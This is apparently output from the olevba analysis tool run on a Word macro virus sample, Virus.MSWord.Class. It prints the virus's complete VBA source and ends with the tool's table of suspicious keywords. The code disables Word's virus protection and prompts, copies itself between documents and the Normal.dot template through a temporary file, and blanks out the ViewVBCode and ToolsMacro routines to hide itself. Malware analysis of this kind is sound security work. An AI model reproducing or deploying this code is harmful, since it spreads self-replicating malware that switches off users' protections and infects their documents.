olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fi-24a4bfb9aceb7d8fa73f52f7c7127d56ae600a67
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fi-24a4bfb9aceb7d8fa73f52f7c7127d56ae600a67 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error GoTo out
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
If Date > #5/20/00# Then
End If
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
If nt > 0 And nt < 3 Then NormalTemplate.VBProject.VBComponents.Item(1).codemodule.deletelines 1
If nt > 3 And ad > 3 Then GoTo out
If nt < 3 Then
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
    host.codemodule.AddFromFile ("c:\class.sys")
    With host.codemodule
      For x = 1 To 4
       .deletelines 1
      Next x
      .replaceline 1, "Sub AutoClose()"
      .replaceline ad - 5, "Sub ViewVBCode()" '44
      .replaceline ad - 2, "Sub ToolsMacro()" '47
     End With
End If
If ad < 3 Then
 Set host = ActiveDocument.VBProject.VBComponents.Item(1)
 NormalTemplate.VBProject.VBComponents.Item(1).Export "c:\class.sys"
 host.codemodule.AddFromFile ("c:\class.sys")
 With host.codemodule
      For x = 1 To 4
       .deletelines 1
      Next x
      .replaceline 1, "Sub AutoOpen()"
      .replaceline nt - 5, "Sub ViewVBCode1()"
      .replaceline nt - 2, "Sub ToolsMacro1()"
     End With
End If
Kill "c:\class.sys"
For Each aTemp In Templates
    If LCase(aTemp.Name) = "Normal.dot" Then aTemp.Save
Next aTemp
out:
If nt > 3 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub ViewVBCode()
'123
End Sub
Sub ToolsMacro()
'123
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

